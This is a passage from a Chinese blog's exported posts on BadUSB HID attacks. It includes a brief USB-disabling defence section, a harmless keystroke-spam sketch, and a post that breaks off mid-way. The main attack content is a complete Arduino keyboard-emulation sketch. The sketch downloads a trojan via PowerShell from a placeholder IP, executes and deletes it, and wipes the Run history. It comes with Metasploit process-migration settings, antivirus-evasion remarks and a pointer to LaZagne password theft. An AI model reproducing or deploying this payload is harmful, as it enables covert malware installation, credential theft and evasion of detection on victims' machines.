title="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"></a>本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点</h3><h3 id="作者博客JoCatW-github-io"><a href="#作者博客JoCatW-github-io" class="headerlink" title="作者博客JoCatW.github.io"></a>作者博客JoCatW.github.io</h3><h1 id="00x11-关于badusb的相关的HID攻击的防御措施"><a href="#00x11-关于badusb的相关的HID攻击的防御措施" class="headerlink" title="00x11 关于badusb的相关的HID攻击的防御措施"></a>00x11 关于badusb的相关的HID攻击的防御措施</h1><h2 id="上面介绍了5种攻击方式，但是对于厂商来说，我们要注意的更多的是蓝方的工作————防御"><a href="#上面介绍了5种攻击方式，但是对于厂商来说，我们要注意的更多的是蓝方的工作————防御" class="headerlink" title="上面介绍了5种攻击方式，但是对于厂商来说，我们要注意的更多的是蓝方的工作————防御"></a>上面介绍了5种攻击方式，但是对于厂商来说，我们要注意的更多的是蓝方的工作————防御</h2><h2 id="在以下我就给大家介绍几种使用的防御措施"><a href="#在以下我就给大家介绍几种使用的防御措施" class="headerlink" title="在以下我就给大家介绍几种使用的防御措施"></a>在以下我就给大家介绍几种使用的防御措施</h2><ol><li><p>如果是linux系统的服务器，我建议可以直接禁用usb接口，或者搞的更Nb点，直接买个usb锁，把所有外接接口给锁上，这样的效果是最好的，当然不排除攻击者会开锁（比如我就会.）<br>而禁用usb接口呢就要修改数据了如下<br>建立一个文件‘/etc/modprobe.d/no-usb‘并且利用下面的命令来禁止探测USB存储。<br>install usvb-storage /bin/true<br>我们也可以通过把U盘需要一个驱动从从内核modules里面挪出来来实现禁用usb接口<br>然后修改gurb启动器也需要“Controller” 和 “USB2.0 Contr01ler” 选项的属性设置 为 “Disableed”，最后更改BIOS密码<br>这样，别就不能通过BIOS来强制开启你的usb了.</p></li><li><p>如果是win系统的服务器，那么就需要改注册表了，不同的系统有不同的方法，有的也可以通过软件来修改，<br>windows2003如果想禁用usb的话就可以打开注册表定位到     HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR<br>将上面的值修改为4，3是启用<br>对于windows还有一种方法就是在每个服务器开机时自启动运行禁用usb的注册表文件，我在这就不写了<br>最后记得每一种方法都得改BIOS密码，而且你的服务器不能让人接触到主板之类的，我建议用双BIOS，这样就不能通过拔插小电池来消除BIOS密码了（实际上也可以通过跳线的方式清空，所以说，物理攻击最为致命啊.）</p></li></ol><h2 id="综上所述，买个usb接口锁是最划算的，或者你直接把usb接口焊下来，然后把焊点抹掉，焊盘搞下来，这样我相信没有啥黑客能随身带个电烙铁和焊珠给你焊usb接口了"><a href="#综上所述，买个usb接口锁是最划算的，或者你直接把usb接口焊下来，然后把焊点抹掉，焊盘搞下来，这样我相信没有啥黑客能随身带个电烙铁和焊珠给你焊usb接口了" class="headerlink" title="综上所述，买个usb接口锁是最划算的，或者你直接把usb接口焊下来，然后把焊点抹掉，焊盘搞下来，这样我相信没有啥黑客能随身带个电烙铁和焊珠给你焊usb接口了."></a>综上所述，买个usb接口锁是最划算的，或者你直接把usb接口焊下来，然后把焊点抹掉，焊盘搞下来，这样我相信没有啥黑客能随身带个电烙铁和焊珠给你焊usb接口了.</h2><h1 id="以上就是我原创的badusb的五种用法"><a href="#以上就是我原创的badusb的五种用法" class="headerlink" title="以上就是我原创的badusb的五种用法"></a>以上就是我原创的badusb的五种用法</h1><h2 id="历时14天，总字数约"><a href="#历时14天，总字数约" class="headerlink" title="历时14天，总字数约"></a>历时14天，总字数约<img src="https://i.loli.net/2020/03/16/Nd3liCurxOhjWw2.png" alt="图片.png"></h2><h2 id="耗费了我大量时间和精力，不过嘛结果还令人满意，也算是我作为安全萌新的第一步了"><a href="#耗费了我大量时间和精力，不过嘛结果还令人满意，也算是我作为安全萌新的第一步了" class="headerlink" title="耗费了我大量时间和精力，不过嘛结果还令人满意，也算是我作为安全萌新的第一步了."></a>耗费了我大量时间和精力，不过嘛结果还令人满意，也算是我作为安全萌新的第一步了.</h2><h2 id="（其实已经省略了一部分了，熟悉我的朋友知道我原来准备写七种，结果谁知道这东西这么麻烦-所以就挑了五种实用的写上去了）"><a href="#（其实已经省略了一部分了，熟悉我的朋友知道我原来准备写七种，结果谁知道这东西这么麻烦-所以就挑了五种实用的写上去了）" class="headerlink" title="（其实已经省略了一部分了，熟悉我的朋友知道我原来准备写七种，结果谁知道这东西这么麻烦.所以就挑了五种实用的写上去了）"></a>（其实已经省略了一部分了，熟悉我的朋友知道我原来准备写七种，结果谁知道这东西这么麻烦.所以就挑了五种实用的写上去了）</h2><h2 id="把这五种汇总的原因也就是我做安全的初心，我虽然不是什么大佬，但是我希望我的人生的意义比我的寿命要长，作出贡献才能创造价值嘛"><a href="#把这五种汇总的原因也就是我做安全的初心，我虽然不是什么大佬，但是我希望我的人生的意义比我的寿命要长，作出贡献才能创造价值嘛" class="headerlink" title="把这五种汇总的原因也就是我做安全的初心，我虽然不是什么大佬，但是我希望我的人生的意义比我的寿命要长，作出贡献才能创造价值嘛."></a>把这五种汇总的原因也就是我做安全的初心，我虽然不是什么大佬，但是我希望我的人生的意义比我的寿命要长，作出贡献才能创造价值嘛.</h2><h2 id="那也就不多说什么了，我也只是一个捡贝壳的孩子"><a href="#那也就不多说什么了，我也只是一个捡贝壳的孩子" class="headerlink" title="那也就不多说什么了，我也只是一个捡贝壳的孩子"></a>那也就不多说什么了，我也只是一个捡贝壳的孩子</h2>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 近源渗透 </category>
          
          <category> badusb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 近源渗透 </tag>
            
            <tag> badusb </tag>
            
            <tag> 蓝方 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb第四期</title>
      <link href="2020/11/08/badusb%E7%AC%AC%E5%9B%9B%E6%9C%9F/"/>
      <url>2020/11/08/badusb%E7%AC%AC%E5%9B%9B%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法"><a href="#HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法" class="headerlink" title="HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)"></a>HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)</h1><h3 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-111-x43-x61-x74-x57-70-89-64-x31-54-x33-46-x63-111-109"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-111-x43-x61-x74-x57-70-89-64-x31-54-x33-46-x63-111-109" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#x4a;&#111;&#x43;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#109;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#111;&#x43;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#109;">&#x4a;&#111;&#x43;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#109;</a></h3><h3 id="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"><a href="#本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"></a>本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点</h3><h3 id="作者博客JoCatW-github-io"><a href="#作者博客JoCatW-github-io" class="headerlink" title="作者博客JoCatW.github.io"></a>作者博客JoCatW.github.io</h3><h2 id="Question3：badusb运行完毕没有删除木马，转移进程啊"><a href="#Question3：badusb运行完毕没有删除木马，转移进程啊" class="headerlink" title="Question3：badusb运行完毕没有删除木马，转移进程啊"></a>Question3：badusb运行完毕没有删除木马，转移进程啊</h2><h2 id="Answer：我们可以在代码的最后添加删除木马的指令。并且，在我们监听的时候加上自动转移进程的模块"><a href="#Answer：我们可以在代码的最后添加删除木马的指令。并且，在我们监听的时候加上自动转移进程的模块" class="headerlink" title="Answer：我们可以在代码的最后添加删除木马的指令。并且，在我们监听的时候加上自动转移进程的模块"></a>Answer：我们可以在代码的最后添加删除木马的指令。并且，在我们监听的时候加上自动转移进程的模块</h2><ol><li>所以我们首先要在监听的时候加上自动转移进程的操作<br>set autorunscript migrate -N explorer.exe<br>或<br>set autorunscript -f<br>第一个是指定迁移到哪个进程，第二个默认迁移到notepad（记事本）</li><li>修改我们的Aurduino badusb代码，利用del命令删除文件<h3 id="所以程序如下"><a href="#所以程序如下" class="headerlink" title="所以程序如下."></a>所以程序如下.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;  </span><br><span class="line">void setup() &#123;  </span><br><span class="line">Keyboard.begin();&#x2F;&#x2F;开始键盘通讯  </span><br><span class="line">delay(10000);&#x2F;&#x2F;延时单位是ms，做测试可以调长一点方便你利用这个时间来下载程序.不然你会哭的.测试完后就可以改为1000ms了  </span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);&#x2F;&#x2F;按下win键  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms,这里的所有延时都要根据实际情况来讲，太短有可能使程序运行失败   </span><br><span class="line">Keyboard.press(&#39;r&#39;);&#x2F;&#x2F;按下r键     </span><br><span class="line">delay(700);&#x2F;&#x2F;延时700ms    </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);&#x2F;&#x2F;松开win键   </span><br><span class="line">Keyboard.release(&#39;r&#39;);&#x2F;&#x2F;松开r键    </span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;按下大写键    </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);&#x2F;&#x2F;松开大写键    </span><br><span class="line">delay(600);&#x2F;&#x2F;延时700ms    </span><br><span class="line">Keyboard.println(&quot;cmd.exe &#x2F;T:01 &#x2F;K mode CON: COLS&#x3D;16 LINES&#x3D;1&quot;);&#x2F;&#x2F;输入创建最小的CMD的程序  </span><br><span class="line">delay(500);&#x2F;&#x2F;延时500ms   </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.println(&quot;powershell&quot;);&#x2F;&#x2F;输入Powershell进入powershell  </span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(700);&#x2F;&#x2F;延时700ms   </span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;按下大写键    </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);&#x2F;&#x2F;松开大写键  </span><br><span class="line">delay(700);&#x2F;&#x2F;延时700ms  </span><br><span class="line">Keyboard.println(&quot;powershell (new-object System.Net.WebClient).DownloadFile( &#39;xxx.xxx.xxx.xxx\1.exe&#39;,&#39;D:\\1.exe&#39;)&quot;);   </span><br><span class="line">&#x2F;&#x2F;上面这条语句是利用powershell下载木马的语句，按照我的标注来就行了，1.exe是你自己木马的名字  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车  </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">Keyboard.println(&quot;START D:\\1.exe&quot;);&#x2F;&#x2F;执行你下载的文件  </span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms  </span><br><span class="line">Keyboard.println(&quot;DEL D:\\1.exe&quot;);&#x2F;&#x2F;删除你下载的文件  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms  </span><br><span class="line">Keyboard.println(&quot;exit&quot;);&#x2F;&#x2F;模拟输入exit来退出Powershell    </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms   </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车</span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms</span><br><span class="line">Keyboard.println(&quot;reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU &#x2F;f&quot;); &#x2F;&#x2F;利用注册表清除开始--运行的记录（打扫战场）</span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms</span><br><span class="line">Keyboard.println(&quot;exit&quot;);&#x2F;&#x2F;模拟输入exit来退出CMD    </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms   </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车    </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms    </span><br><span class="line">Keyboard.end();&#x2F;&#x2F;结束键盘通讯   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop()&#x2F;&#x2F;循环  </span><br><span class="line">&#123;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>然后我们烧录代码即可.</li></ol><h2 id="到这我们的终极版badusb也终于制作完成了，成功的实现了免杀，插上去自动转移进程，隐藏窗口的效果，而剩下的速度上的优化，就看各位小伙伴们自己的啦"><a href="#到这我们的终极版badusb也终于制作完成了，成功的实现了免杀，插上去自动转移进程，隐藏窗口的效果，而剩下的速度上的优化，就看各位小伙伴们自己的啦" class="headerlink" title="到这我们的终极版badusb也终于制作完成了，成功的实现了免杀，插上去自动转移进程，隐藏窗口的效果，而剩下的速度上的优化，就看各位小伙伴们自己的啦."></a>到这我们的终极版badusb也终于制作完成了，成功的实现了免杀，插上去自动转移进程，隐藏窗口的效果，而剩下的速度上的优化，就看各位小伙伴们自己的啦.</h2><h1 id="00x9-badusb盗取用户信息"><a href="#00x9-badusb盗取用户信息" class="headerlink" title="00x9 badusb盗取用户信息"></a>00x9 badusb盗取用户信息</h1><p>在上面我们是通过植入木马来对于靶机进行控制，而在实际操作中有时是为了获取数据.<br>在这里我们可以使用LaZagne，一款强大的密码抓取工具，浏览器记住的密码相当于明文存储在硬盘上。用户名密码这些深层的密码。理论上，都可以被提取出来。<br>而这边这种方法我就不再赘述了  </p><h4 id="具体的内容可以看j0的文章https-blog-csdn-net-qq-26091745-article-details-98092211"><a href="#具体的内容可以看j0的文章https-blog-csdn-net-qq-26091745-article-details-98092211" class="headerlink" title="具体的内容可以看j0的文章https://blog.csdn.net/   qq_26091745/article/details/98092211"></a>具体的内容可以看j0的文章<a href="https://blog.csdn.net/">https://blog.csdn.net/</a>   qq_26091745/article/details/98092211</h4><h4 id="还有github上一位大佬的文章https-www-cdxy-me-p-549"><a href="#还有github上一位大佬的文章https-www-cdxy-me-p-549" class="headerlink" title="还有github上一位大佬的文章https://www.cdxy.me/?p=549"></a>还有github上一位大佬的文章<a href="https://www.cdxy.me/?p=549">https://www.cdxy.me/?p=549</a></h4><h1 id="00x10-badusb自动打招呼机（复读机）"><a href="#00x10-badusb自动打招呼机（复读机）" class="headerlink" title="00x10 badusb自动打招呼机（复读机）"></a>00x10 badusb自动打招呼机（复读机）</h1><p>这边其实就算是一个娱乐的玩法<br>主要玩法就是让badusb不断模拟人输入指定语句并发送<br>也可以制作复读机，通过鼠标的移动复制来实现效果.<br>而我做这个的原因更多是告诫那些祖安嘴臭人，你们在网上到处乱喷时，也可能只是与一块小小的单片机对喷，就你那点实力，还是喷不过单片机的.哈哈.<br>甚至你还可以用这个来播放精神小伙语录，和名言大全<br>简直很必备啊，有木有.</p><h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下."></a>代码如下.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;</span><br><span class="line">Keyboard.begin();&#x2F;&#x2F;开始键盘通讯</span><br><span class="line">delay(10000);&#x2F;&#x2F;延时单位是ms，做测试可以调长一点方便你利用这个时间来下载程序.不然你会哭的.测试完后就可以改为1000ms了</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop()&#x2F;&#x2F;循环</span><br><span class="line">&#123;</span><br><span class="line"> Keyboard.begin();&#x2F;&#x2F;开始键盘通讯</span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;Hello&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;Start&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms  </span><br><span class="line"> Keyboard.println(&quot;No learning, no learning, no benefit to anybody at any time.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;If a man works only for himself, he may become a famous scholar, a brilliant intellectual, but he can never be a real perfect man.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;Virtue, virtue peculiar to women, but harm themselves, their gentle and submissive asexual, actually make them of bondage and suffering.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;Violence Is the Old Society&#39;s Mid-wife That Helps Conceive Every New Society.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;as soon as man learns to walk he also learns to fall, and only through falling does he learn to walk.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;Sincere, very sensible life of friendship is priceless.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;Friendship, like the morning fog, like purity, flattery does not get it, friendship can only be faithful to consolidate.&quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;There is no plane route in science, only the one person who crawls along the cragged could reach to the bright top, not be fear of hardship. &quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line"> Keyboard.println(&quot;There is no plane route in science, only the one person who crawls along the cragged could reach to the bright top, not be fear of hardship. &quot;);&#x2F;&#x2F;输入指定内容</span><br><span class="line"> Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line"> Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line"> delay(800);&#x2F;&#x2F;延时200ms</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="当然这边你所有的Keyboard-println-“”-里都可以放你喜欢的东西"><a href="#当然这边你所有的Keyboard-println-“”-里都可以放你喜欢的东西" class="headerlink" title="当然这边你所有的Keyboard.println(“”)里都可以放你喜欢的东西"></a>当然这边你所有的Keyboard.println(“”)里都可以放你喜欢的东西</h3><h3 id="而这边的delay延时也可以自己设置，看看多少速度比较合适"><a href="#而这边的delay延时也可以自己设置，看看多少速度比较合适" class="headerlink" title="而这边的delay延时也可以自己设置，看看多少速度比较合适"></a>而这边的delay延时也可以自己设置，看看多少速度比较合适</h3><h3 id="然后烧录上去就Ok啦"><a href="#然后烧录上去就Ok啦" class="headerlink" title="然后烧录上去就Ok啦"></a>然后烧录上去就Ok啦</h3><h3 id="记得在10秒延迟前把你的鼠标指针定位在你想发送的地方，并且切换英文输入法"><a href="#记得在10秒延迟前把你的鼠标指针定位在你想发送的地方，并且切换英文输入法" class="headerlink" title="记得在10秒延迟前把你的鼠标指针定位在你想发送的地方，并且切换英文输入法"></a>记得在10秒延迟前把你的鼠标指针定位在你想发送的地方，并且切换英文输入法</h3><h3 id="当你想退出的时候就直接拔掉就OK"><a href="#当你想退出的时候就直接拔掉就OK" class="headerlink" title="当你想退出的时候就直接拔掉就OK"></a>当你想退出的时候就直接拔掉就OK</h3><p><img src="https://i.loli.net/2020/03/16/3Wvps18gunPS2oZ.png" alt="图片.png"><br>哈哈效果不错.</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 近源渗透 </category>
          
          <category> badusb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 近源渗透 </tag>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb第三期</title>
      <link href="2020/11/08/badusb%E7%AC%AC%E4%B8%89%E6%9C%9F/"/>
      <url>2020/11/08/badusb%E7%AC%AC%E4%B8%89%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法"><a href="#HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法" class="headerlink" title="HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)"></a>HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)</h1><h3 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-x6f-x43-x61-116-87-x46-89-64-49-54-51-x2e-x63-x6f-x6d"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-x6f-x43-x61-116-87-x46-89-64-49-54-51-x2e-x63-x6f-x6d" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#74;&#x6f;&#x43;&#x61;&#116;&#87;&#x46;&#89;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#74;&#x6f;&#x43;&#x61;&#116;&#87;&#x46;&#89;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#74;&#x6f;&#x43;&#x61;&#116;&#87;&#x46;&#89;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a></h3><h3 id="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"><a href="#本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"></a>本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点</h3><h3 id="作者博客JoCatW-github-io灵猫论坛bbs-ipghost-cn"><a href="#作者博客JoCatW-github-io灵猫论坛bbs-ipghost-cn" class="headerlink" title="作者博客JoCatW.github.io灵猫论坛bbs.ipghost.cn"></a>作者博客JoCatW.github.io灵猫论坛bbs.ipghost.cn</h3><h1 id="00x8-MSF配合badusb的最终版（有免杀，自动转移进程，真正意义上的一插就渗透成功-）"><a href="#00x8-MSF配合badusb的最终版（有免杀，自动转移进程，真正意义上的一插就渗透成功-）" class="headerlink" title="00x8 MSF配合badusb的最终版（有免杀，自动转移进程，真正意义上的一插就渗透成功.）"></a>00x8 MSF配合badusb的最终版（有免杀，自动转移进程，真正意义上的一插就渗透成功.）</h1><h2 id="啥-你讲我powershell那么大一个框框玩意被别人看到怎么办-程序执行完连poweshell都不关-木马都留下来了"><a href="#啥-你讲我powershell那么大一个框框玩意被别人看到怎么办-程序执行完连poweshell都不关-木马都留下来了" class="headerlink" title="啥?你讲我powershell那么大一个框框玩意被别人看到怎么办?程序执行完连poweshell都不关,木马都留下来了.."></a>啥?你讲我powershell那么大一个框框玩意被别人看到怎么办?程序执行完连poweshell都不关,木马都留下来了..</h2><h2 id="啥-你讲我基础教程做的太差-一开杀软就拦截"><a href="#啥-你讲我基础教程做的太差-一开杀软就拦截" class="headerlink" title="啥?你讲我基础教程做的太差,一开杀软就拦截?"></a>啥?你讲我基础教程做的太差,一开杀软就拦截?</h2><h2 id="啥-你讲我进程不转移会被杀软报毒"><a href="#啥-你讲我进程不转移会被杀软报毒" class="headerlink" title="啥?你讲我进程不转移会被杀软报毒?"></a>啥?你讲我进程不转移会被杀软报毒?</h2><h2 id="这些是事吗-都不是事-我今天就把badusb的我认为的最终版做出来"><a href="#这些是事吗-都不是事-我今天就把badusb的我认为的最终版做出来" class="headerlink" title="这些是事吗?都不是事.我今天就把badusb的我认为的最终版做出来!"></a>这些是事吗?都不是事.我今天就把badusb的我认为的最终版做出来!</h2><h2 id="我们将根据以上三个很重要的问题来一一解决-感谢各位看到这"><a href="#我们将根据以上三个很重要的问题来一一解决-感谢各位看到这" class="headerlink" title="我们将根据以上三个很重要的问题来一一解决(感谢各位看到这.)"></a>我们将根据以上三个很重要的问题来一一解决(感谢各位看到这.)</h2><p>Question1:powershell那么大一个框框别人是眼瞎吗?看到怎么办?程序执行完连poweshell都不关,木马都留下来了..<br>Answer:对于这个问题,我们的解决方法很简单<br>一、首先是窗口大的问题<br>我们可以添加简单的隐藏窗口参数的方法<br>比如PowerShell.exe -WindowStyle Hidden这个语句即可<br>不过啊,火绒真是让我又爱又恨<br><img src="https://i.loli.net/2020/03/12/irYlPqEv48GewDB.png" alt="QQ截图20200312091026.png"><br>经过测试,我发现一旦调用Powersell的Hidden参数就会被火绒拦截<br>我们只能换一种思路,既然Hidden参数会拦截,为什么我们不最小化呢,这效果也不错的<br>把Hidden参数,替换为Minimized参数,也就是最小化的意思.<br>语句如下PowerShell.exe -WindowStyle Minimized<br>意思就是打开一个Powershell并最小化.  </p><h3 id="但是啊-各位-最小化之后你的语句怎么输入呢…"><a href="#但是啊-各位-最小化之后你的语句怎么输入呢…" class="headerlink" title="但是啊,各位,最小化之后你的语句怎么输入呢…"></a>但是啊,各位,最小化之后你的语句怎么输入呢…</h3><p>所以我们并不能最小化程序,我们可以再换一种思路(我认为最完美的一种)<br>我们可以先调用CMD再通过调整CMD窗口的大小来隐藏命令，再通过CMD来调用Powershell  </p><p>二、我们的问题中还有一个问题,那就是执行完并没有把CMD关闭<br>我们也可以利用exit语句放在最后来避免问题发生. </p><p>三、我们的木马文件没有删除啊，怎么办呢?<br>我们关于删除木马文件的工作要放到第三个问题”进程不转移会被杀软报毒”中一起解决，我们将会在生成木马的时候就添加自动转移进程的参数，这样我们就可以删掉文件而且进程也成功转移了.</p><h3 id="所以程序如下"><a 